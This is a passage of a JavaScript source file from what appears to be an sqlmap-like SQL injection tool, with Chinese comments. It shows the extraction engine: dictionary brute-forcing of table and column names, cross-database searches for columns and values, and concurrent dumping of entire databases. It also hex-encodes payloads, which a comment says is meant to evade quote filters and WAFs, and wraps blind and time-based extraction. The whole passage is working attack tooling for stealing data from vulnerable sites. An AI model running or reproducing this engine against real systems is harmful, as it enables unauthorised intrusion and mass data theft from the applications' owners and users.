  //   而不是返回空结果让上层误读成「目标确实没有这些表」（假阴性）。
  async findCommonTables(ctx, db) {
    const columns = await this._guessColumnsCached(ctx);
    const sanity = await this.extractScalar(ctx, '1', columns);
    if (sanity == null) {
      logger.warn('common-tables：提取通道不可用（常量回显失败），字典爆破跳过');
      return { tables: [], tried: 0, found: 0, reason: 'CHANNEL_UNAVAILABLE' };
    }
    // 对照名必须不存在：若连它都能"取到行数"，说明该目标的提取结果不可信，宁可不出结论
    let control = null;
    try { control = await this.countRows(ctx, db, NONEXISTENT_PROBE); } catch { control = null; }
    if (control !== null) {
      logger.warn('common-tables：不存在对照名竟返回行数，判定不可靠，跳过');
      return { tables: [], tried: 0, found: 0, reason: 'CONTROL_UNRELIABLE' };
    }
    const found = [];
    for (const t of COMMON_TABLES) {
      let n = null;
      try { n = await this.countRows(ctx, db, t); } catch { n = null; }
      if (n !== null) {
        found.push(t);
        logger.info(`common-tables 命中：${db}.${t}（行数 ${n}）`);
      }
    }
    logger.info(`common-tables 汇总：db=${db} 尝试 ${COMMON_TABLES.length} 个候选名，命中 ${found.length} 个`);
    return { tables: found, tried: COMMON_TABLES.length, found: found.length };
  }

  // 列名字典爆破（对标 sqlmap --common-columns）：表存在性由调用方保证（-T 指定或 commonTables 结果）。
  // 探针 `SELECT COUNT(<col>) FROM <t>`：列不存在 → 报错 → null；存在（哪怕全 NULL）→ 数字。
  async findCommonColumns(ctx, db, table) {
    if (!table) return { columns: [], tried: 0, found: 0, reason: 'NO_TABLE' };
    const edb = resolveDbms(ctx.dbms);
    const columns = await this._guessColumnsCached(ctx);
    const found = [];
    for (const c of COMMON_COLUMNS) {
      let val = null;
      try {
        val = await this.extractScalar(ctx, `(SELECT COUNT(${c}) FROM ${tableRef(edb, db, table)})`, columns);
      } catch { val = null; }
      if (val !== null) found.push(c);
    }
    return { columns: found, tried: COMMON_COLUMNS.length, found: found.length };
  }

  // 带 WHERE 条件的行数统计（对标 sqlmap --count --where）：
  // 复用 extractScalar 提取 COUNT_WHERE_QUERY 结果，返回数字或 null。
  // where 为原始 SQL WHERE 子句，不做转义（与 sqlmap --where 行为一致）。
  async countRowsWhere(ctx, db, table, where) {
    const edb = resolveDbms(ctx.dbms);
    const q = COUNT_WHERE_QUERY[edb];
    if (!q) return null;
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(ctx, q(db, table, where), columns);
    if (val == null || val === '') return null;
    const n = Number(String(val).trim());
    return Number.isFinite(n) ? n : null;
  }

  // ===== [sqlmap 对标 --search] 跨库搜索 =====

  // 搜索列名（对标 sqlmap --search -C）：跨所有库搜索列名匹配 searchTerm 的列，
  // 返回 "db.table.column" 字符串数组。支持 opts.start / opts.stop 限制结果范围。
  // MySQL/PG/MSSQL 用 information_schema.columns，Oracle 用 all_tab_columns，
  // SQLite 无 information_schema → 逐表迭代 pragma_table_info。
  // [对标 sqlmap --hex] 搜索类 SQL 的 LIKE 模式十六进制化（不支持的方言保持原样并告警）
  _applyHex(ctx, sql, searchTerm, edb) {
    if (ctx.config?.hex !== true) return sql;
    try {
      const out = hexifyLikeInQuery(sql, searchTerm, edb, true);
      if (out !== sql) logger.info(`--hex 已生效：LIKE 模式转为 ${edb} 十六进制字面量`);
      return out;
    } catch (e) {
      logger.warn(`--hex 未生效（${e.message}）；本次搜索仍用普通 LIKE 模式`);
      return sql;
    }
  }

  async searchColumns(ctx, searchTerm, opts = {}) {
    const edb = resolveDbms(ctx.dbms);
    // SQLite：无 information_schema，逐表枚举列名匹配
    if (edb === 'SQLite') {
      const tables = await this.enumerateTables(ctx, null);
      const results = [];
      const term = String(searchTerm).toLowerCase();
      for (const table of tables) {
        try {
          const cols = await this.enumerateColumns(ctx, null, table);
          for (const col of cols) {
            if (col.toLowerCase().includes(term)) {
              results.push(`main.${table}.${col}`);
            }
          }
        } catch { /* 跳过不可访问的表 */ }
      }
      return this._applySearchLimits(results, opts, ctx);
    }
    const q = SEARCH_COLUMNS_QUERY[edb];
    if (!q) return [];
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(ctx, this._applyHex(ctx, q(searchTerm), searchTerm, edb), columns);
    if (!val) return [];
    const results = val.split(',').filter(Boolean);
    return this._applySearchLimits(results, opts, ctx);
  }

  // 搜索表名（对标 sqlmap --search -T）：跨所有库搜索表名匹配 searchTerm 的表，
  // 返回 "db.table" 字符串数组（SQLite 返回 "table"）。支持 opts.start / opts.stop 限制结果范围。
  // MySQL/PG/MSSQL 用 information_schema.tables，Oracle 用 all_tables，SQLite 用 sqlite_master。
  async searchTables(ctx, searchTerm, opts = {}) {
    const edb = resolveDbms(ctx.dbms);
    const q = SEARCH_TABLES_QUERY[edb];
    if (!q) return [];
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(ctx, this._applyHex(ctx, q(searchTerm), searchTerm, edb), columns);
    if (!val) return [];
    const results = val.split(',').filter(Boolean);
    return this._applySearchLimits(results, opts, ctx);
  }

  // 搜索列值（对标 sqlmap --search -C column_name + value search）：
  // 先用 searchColumns 找到列名匹配的列，再在各表中搜索值匹配 searchTerm 的行。
  // 返回按 "db.table" 分组的匹配行对象 { "db.table": [{...}, ...] }。
  async searchColumnData(ctx, column, searchTerm, opts = {}) {
    // 1. 找到列名匹配的列
    const matchingColumns = await this.searchColumns(ctx, column, opts);
    if (!matchingColumns.length) return {};
    // 2. 在各表中搜索值匹配的行
    const results = {};
    for (const entry of matchingColumns) {
      const parts = entry.split('.');
      // 兼容两种返回形态：`db.table.column`（主流库）与 `table.column`
      // （Firebird/Informix 无 schema 概念，模板只拼两段 —— 旧实现直接 continue 导致这两库恒返回空）
      let db; let table; let col;
      if (parts.length >= 3) {
        [db, table, col] = parts;
      } else if (parts.length === 2) {
        [table, col] = parts;
        db = null; // 无 schema 概念时用 null，与 SQLite 逐表迭代路径一致
      } else {
        continue;
      }
      // 构造 WHERE 子句：col LIKE '%searchTerm%'
      //   [对标 sqlmap --hex] 开启时把模式转成十六进制字面量，payload 里不再出现引号与 %，
      //   用于绕过引号过滤/WAF。不支持的方言会显式抛错（见 hexLiteral.js），不静默降级。
      const edb = resolveDbms(ctx.dbms);
      const useHex = ctx.config?.hex === true;
      let where;
      try {
        where = `${col} LIKE ${buildLikePattern(searchTerm, edb, useHex)}`;
      } catch (e) {
        // 方言不支持 → 明确告知后回退普通形态（但先把原因打到日志，避免静默失效）
        logger.warn(`--hex 未生效：${e.message}`);
        where = `${col} LIKE '%${escSql(searchTerm)}%'`;
      }
      try {
        const rows = await this.dumpData(ctx, db, table, [col], null, { where, ...opts });
        if (rows && rows.length) {
          const key = `${db}.${table}`;
          if (!results[key]) results[key] = [];
          results[key].push(...rows);
        }
      } catch { /* 跳过不可访问的表 */ }
    }
    return results;
  }

  // 搜索结果 --start/--stop 限制（内部辅助）
  _applySearchLimits(results, opts, ctx) {
    // 归一化口径复用 posInt（与 dumpData 共用同一份判据，避免两处对同一配置给出不同区间）
    const start = posInt(opts.start ?? ctx.config?.dumpStart);
    const stop = posInt(opts.stop ?? ctx.config?.dumpStop);
    let r = results;
    if (start > 0) r = r.slice(start);
    // stop 必须大于 start：否则 stop-start 为负，slice(0, 负数) 会误删末尾元素而非返回空
    if (stop > start) r = r.slice(0, stop - start);
    else if (stop > 0 && start >= stop) r = [];
    return r;
  }

  // ===== [sqlmap 对标 --dump-format] 数据导出格式化 =====
  // [大文件拆分 2026-09-20] 实现已外移至 engine/dumpFormat.js（纯函数、无 this 依赖）。
  // 下方 5 个方法保留同名薄委托：外部实例引用零影响，行为逐字等价。
  //
  // ⚠ 如实记录（勿美化）：这 5 个方法在 `src/` 内**当前无任何调用点**，
  //   连 `ctx.config.dumpFormat` 都未被接线 —— 即「格式化已实现但链路未接」。
  //   故保留薄委托不是为了"迁移既有调用方"，而是为了 (a) 不破坏任何外部/动态调用，
  //   (b) 等接线时接口就位。真行为保证在 dumpFormat.test.js（直接测实现，27 例），
  //   不在这层委托上。

  // [DEAD-CODE 2026-10-05] 此处原有 5 个薄委托：formatDumpData / _formatCsv /
  //   _escapeCsvCell / _formatSql / _formatHtml。已删除。
  // 依据（全仓 grep 核实，非推测）：
  //   · 唯一调用形态是 `this.formatDumpData(...)`，全仓（含 src/、e2e/、server/tests/）
  //     除本文件注释外**零命中**；
  //   · 所有测试都直接 import dumpFormat.js 的函数本身（dumpFormat.test.js、
  //     dumpFormat.formula.test.js），不经过类方法。
  // 真正的实现与它的 JSDoc 契约（全在 dumpFormat.js）：'json' 返回原始数组、
  //   空数据返回格式骨架、未知 format 抛错不静默回落。
  // 为什么该删而不是留：薄委托的唯一价值是"未来会有人用"。而它同时制造了一个
  //   **会漂移的接口**——委派签名与实现签名是两处独立声明，改一边不会编译报错；
  //   事实上这 5 个方法里 formatDumpData 自己又写了一遍 `format = 'json'` 默认值，
  //   与 dumpFormat.js 的默认值构成第二处副本（当前恰好相同，但无任何机制保证它）。

  // 并发多表拖库：同库内表级并发（受 dumpConcurrency 约束），单表失败不影响其他表
  async dumpDatabase(ctx, db, opts = {}) {
    const tables = await this.enumerateTables(ctx, db);
    const concurrency = ctx.config?.dumpConcurrency || 4;
    const columns = {};
    const rows = {};
    const worker = async (table) => {
      const cols = await this.enumerateColumns(ctx, db, table);
      columns[table] = cols;
      try {
        rows[table] = await this.dumpData(ctx, db, table, cols, null, opts);
      } catch (e) {
        // UNION 提取失败（WAF/列数限制）→ 堆叠深度提取兜底（需目标支持 stacked queries）
        if (opts.fallback) {
          opts.onFallback?.(table);
          rows[table] = await opts.fallback(ctx, db, table, cols, e);
        } else {
          throw e;
        }
      }
    };
    await this._concurrentMap(tables, worker, concurrency);
    return { tables, columns, rows };
  }

  // 跨库并发拖库：库级并发（受 dumpDatabaseConcurrency 约束），单库失败不影响其他库。
  // 返回聚合结构：{ databases, tables:{db:[t]}, columns:{'db.t':[c]}, rows:{'db.t':[obj]} }
  // columns/rows 已加 db. 前缀，与 ScanManager._extract 的取用方式对齐。
  async dumpAllDatabases(ctx, dbs, opts = {}) {
    const concurrency = ctx.config?.dumpDatabaseConcurrency || 2;
    const tables = {};
    const columns = {};
    const rows = {};
    // [P0 2026-09-09] 「0 行未确认」表收集：空结果 ≠ 空表，交付前必须可见
    const unconfirmedEmpty = [];
    const workerOpts = {
      ...opts,
      onUnconfirmedEmpty: (db, table) => {
        unconfirmedEmpty.push(`${db}.${table}`);
        opts.onUnconfirmedEmpty?.(db, table);
      },
    };
    const worker = async (db) => {
      const dumped = await this.dumpDatabase(ctx, db, workerOpts);
      tables[db] = dumped.tables;
      for (const [t, cols] of Object.entries(dumped.columns)) {
        columns[`${db}.${t}`] = cols;
      }
      for (const [t, rws] of Object.entries(dumped.rows)) {
        rows[`${db}.${t}`] = rws;
      }
    };
    await this._concurrentMap(dbs, worker, concurrency);
    return { databases: dbs, tables, columns, rows, meta: unconfirmedEmpty.length ? { dumpUnconfirmed: unconfirmedEmpty } : null };
  }

  // 通用并发映射：任务间顺序无关；单任务异常被吞，不中断其他任务（与 _sendBatch 一致容错）
  async _concurrentMap(items, fn, concurrency) {
    const queue = items.slice();
    let cursor = 0;
    const run = async () => {
      while (cursor < queue.length) {
        const i = cursor++;
        try {
          await fn(queue[i], i);
        } catch (e) {
          logger.debug(`[extract] 单表提取失败: ${e?.message || e}`);
        }
      }
    };
    const pool = Array.from({ length: Math.min(concurrency, queue.length) }, () => run());
    await Promise.all(pool);
  }

  // ===== 盲注/时间/内联提取：实现已抽至 engine/blindExtractor.js（薄包装保持调用方零改动） =====
  //
  // [2026-10-05] 每个入口先 _resetLimitHit()。原因见构造函数里 _limitHit 的说明：
  // 本实例被 ScanManager 复用（跨注入点/多轮提取），"请求上限已命中"是**本次提取**的
  // 终止信号，不复位会让第一次撞上限后，后续所有注入点的 worker 直接 break，
  // 表现为"后面的注入点静默提不出数据"且无任何报错。
  // 放在薄包装这一层而非各实现内部，是为了让"进入提取即复位"成为一条**结构上无法绕过**的规则：
  // 实现函数（blindExtractor.js 里的 *Impl）是被抽出去的纯函数，将来若有人直接在别处
  // 调 *Impl，包装层的复位不会生效；因此 *Impl 本身不得被当作对外入口使用。
  async extractBoolean(ctx, expr) { this._resetLimitHit(); return extractBooleanImpl(this, ctx, expr); }
  async extractProof(ctx) { this._resetLimitHit(); return extractProofImpl(this, ctx); }
  async extractTimeProof(ctx) { this._resetLimitHit(); return extractTimeProofImpl(this, ctx); }
  async extractTime(ctx, expr) { this._resetLimitHit(); return extractTimeImpl(this, ctx, expr); }
  async calibrateTimeSleep(ctx, base, condFn) { this._resetLimitHit(); return calibrateTimeSleepImpl(this, ctx, base, condFn); }
  async extractInline(ctx, sql) { this._resetLimitHit(); return extractInlineImpl(this, ctx, sql); }
  async extractInlineProof(ctx) { this._resetLimitHit(); return extractInlineProofImpl(this, ctx); }
}

export default Extractor;

// 猜列缓存（模块级，按「目标作用域 + 注入点」稳定 key 复用，同注入点跨检测器零请求）
// ★FIX [正确性] 原 cacheKey 只用 point.id（location:param:actionUrl 的哈希，不含 host），
// 两个目标存在同路径同名参数（/item.php?id= 极常见）时后扫目标会复用前目标的列数，
// 导致 UNION 标记列数错位。现统一经 colGuessScopeKey 掺入 target.baseUrl 隔离。
export const _colGuessCache = new Map();

/**
 * 生成带目标作用域的猜列缓存 key：`${baseUrl}|${pointId}|${extra}`。
 * extra 由调用方给 colGuessExtra(ctx, boundary) —— 请求形态维度（闭合符/tamper 链/混淆），
 * 防 A 形态下猜出的列数被 B 形态的扫描复用。
 * @param {object|null} target 扫描目标（取其 baseUrl 做作用域隔离）
 * @param {string|undefined} pointId 注入点 id
 * @param {string} [extra] 请求形态维度（见 colGuessExtra）
 */
export function colGuessScopeKey(target, pointId, extra = '') {
  const scope = target && typeof target.baseUrl === 'string' ? target.baseUrl : '';
  return `${scope}|${pointId ?? ''}|${extra}`;
}
